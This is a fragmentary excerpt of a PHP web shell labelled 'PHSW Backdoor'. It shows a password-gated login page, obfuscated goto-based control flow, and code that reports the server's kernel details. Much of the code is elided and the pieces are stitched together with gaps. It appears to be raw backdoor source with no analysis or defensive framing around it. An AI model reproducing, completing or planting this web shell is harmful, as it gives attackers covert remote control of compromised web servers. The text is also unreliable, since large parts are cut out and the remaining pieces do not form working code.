...
?>
 ...
 ?>
	<html>
		...
		<body>
			<center>
				<font style="color:#0ff" size="10">PHSW Backdoor</font><br><br>Kernel :<?php
    goto PeYM6;
    HRIz1:
    @clearstatcache();
    goto pHFGp;
...
<html><head><title>PHSW Backdoor</title><link href="https://i.screenshot.net/z7xj4fg"rel="icon"><style>html{background:url(https://wallup.net/wp-content/uploads/2016/01/245263-space-smoke-men-748x421.jpg);background-size:cover;background-color:#000;background-repeat:no-repeat;background-position:center;background-attachment:fixed;color:#fff}input{background:0 0;color:#0ff;border:1px solid #fff}</style></head><body><table width="100%"height="100%"><td align="center"><font style="color:#0ff"size="10">PHSW Backdoor</font><br><br>Smoking, Like Exploring The Universe<br><br><form enctype="multipart/form-data"method="post"><input type="password"name="passwd"> <input type="submit"name="pass"value="Login"></form></td></table></body></html><?php die();}
goto Q1OFe;
PeYM6:
echo php_uname();
goto NJzU0;
...
l2jq8:
?>
</center><br><div style="padding:10px;border:1px solid #fff;color:#0ff;text-align:center">PHSW Backdoor</div></body></html>